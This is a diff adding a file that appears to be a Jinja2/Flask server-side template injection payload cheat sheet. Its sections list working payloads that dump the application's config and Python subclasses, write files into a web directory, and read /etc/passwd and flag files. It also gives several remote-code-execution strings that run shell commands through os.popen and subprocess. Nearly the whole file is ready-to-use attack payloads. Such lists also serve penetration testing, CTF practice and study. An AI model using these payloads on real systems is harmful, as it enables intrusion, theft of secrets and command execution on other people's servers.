@@ -1,0 +1,48 @@
+{{4*4}}[[5*5]]
+{{7*'7'}} would result in 7777777
+{{config.items()}}
+
+//Template Format
+{% extends "layout.html" %}
+{% block body %}
+  <ul>
+  {% for user in users %}
+    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
+  {% endfor %}
+  </ul>
+{% endblock %}
+
+//Debug statement
+<pre>{% debug %}</pre>
+
+//Dump used classes
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+
+//Dump config var
+{% for key, value in config.iteritems() %}
+    <dt>{{ key|e }}</dt>
+    <dd>{{ value|e }}</dd>
+{% endfor %}
+
+//Write into remote file
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+
+
+//Read remote files
+# ''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+
+//RCE
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
